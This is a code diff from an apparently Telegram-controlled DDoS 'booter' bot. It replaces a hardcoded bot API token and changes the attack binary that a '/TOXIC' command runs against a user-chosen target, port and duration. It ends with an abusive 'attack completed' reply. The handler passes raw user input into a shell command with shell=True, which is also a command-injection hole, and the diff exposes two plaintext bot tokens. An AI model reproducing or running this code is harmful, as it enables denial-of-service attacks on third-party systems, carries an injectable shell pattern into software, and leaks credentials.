@@ -6,7 +6,7 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7602703112:AAFMM8pv19u7O1bnetbYorADWNpwiUs3gHs')
+bot = telebot.TeleBot('7602703112:AAGBmOLaYz6ybK_0Cgs-ld54DqfxmxlPn2g')
 
 # Admin user IDs
 admin_id = {"6882674372"}
@@ -233,7 +233,7 @@ def handle_TOXIC(message):
                 record_command_logs(user_id, '/TOXIC', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./rahul {target} {port} {time} "
+                full_command = f"./arman {target} {port} {time} "
                 subprocess.run(full_command, shell=True)
                 response = f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target}\n𝐏𝐎𝐑𝐓 -> {port}\n𝐓𝐈𝐌𝐄 -> {time}\n\nLAWDE TERA FEEDBACK NHI MIL RHA HAI"
         else:
